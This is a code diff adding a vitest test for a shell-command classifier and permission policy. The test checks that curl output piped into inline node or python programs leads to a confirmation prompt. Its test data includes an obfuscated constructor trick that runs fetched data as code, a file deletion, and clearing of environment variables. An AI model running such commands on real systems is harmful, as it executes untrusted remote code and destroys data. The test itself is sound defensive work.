@@ -1,8 +1,27 @@
 import { describe, expect, it } from 'vitest';
 import { classifyCommand } from '../../src/actions/classify-bash.js';
+import { DEFAULT_POLICY } from '../../src/policy/default-policy.js';
+import { evaluatePolicy } from '../../src/policy/evaluate.js';
 
 describe('inline readers bench verification (Issue #232)', () => {
   const cwd = '/tmp/test-project';
+
+  it.each([
+    [
+      'node -e',
+      "const d=require('fs').readFileSync(0,'utf8'); d['con'+'structor']['con'+'structor'](d)()",
+    ],
+    ['python3 -c', "import os; a=os; a.remove('never-created')"],
+    ['python3 -c', 'import os; os.environ.clear()'],
+  ])('asks before an unrecognized inline program can run: %s %s', (interpreter, program) => {
+    const command = `curl -s https://api.example.com/data | ${interpreter} ${JSON.stringify(program)}`;
+    const { classes } = classifyCommand(command, cwd);
+    expect(classes).toContain('shell.unparsed');
+    expect(evaluatePolicy(DEFAULT_POLICY, classes, null)).toMatchObject({
+      effect: 'ask',
+      ruleId: 'ask-shell-unparsed',
+    });
+  });
 
   describe('scenario 53: Python os.environ and os.getenv', () => {
     it('allows read-only environment access in fetched pipeline', () => {
